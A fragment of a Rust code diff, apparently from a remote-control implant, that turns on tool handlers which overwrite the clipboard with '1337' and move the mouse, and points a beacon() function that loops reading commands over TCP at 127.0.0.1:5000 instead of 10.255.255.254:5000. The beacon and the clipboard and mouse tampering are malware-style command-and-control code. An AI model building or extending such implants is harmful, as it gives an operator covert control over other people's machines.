@@ -106,15 +106,17 @@ pub fn run(tool: Tool) -> Result<String, Box<dyn Error>> {
             let text = clipboard::run()?;
             Ok(text)
         }
-        // Tool::ReplaceBoard => {
-        //     let _ = replaceboard::run()?;
-        // }
+        Tool::ReplaceBoard => {
+            let _ = replaceboard::run()?;
+            Ok(String::from("Replaced clipboard with text \'1337\'"))
+        }
         // Tool::Ghost => {
         //     let _ = ghost::run()?;
         // }
-        // Tool::Mouseketool => {
-        //     let _ = mouseketool::run()?;
-        // } 
+        Tool::Mouseketool => {
+            let _ = mouseketool::run()?;
+            Ok(String::from("Moved the mouse"))
+        } 
         // Tool::Obufscate => {
         //     let filename = get_filename()?;
         //     let _ = obfuscate::run(filename)?;
@@ -129,7 +131,7 @@ pub fn run(tool: Tool) -> Result<String, Box<dyn Error>> {
 }
 
 pub fn beacon() {
-    if let Ok(mut stream) = TcpStream::connect("10.255.255.254:5000") {
+    if let Ok(mut stream) = TcpStream::connect("127.0.0.1:5000") {
         loop {
             let mut buffer = [0; 1024];
             if let Ok(n) = stream.read(&mut buffer) {
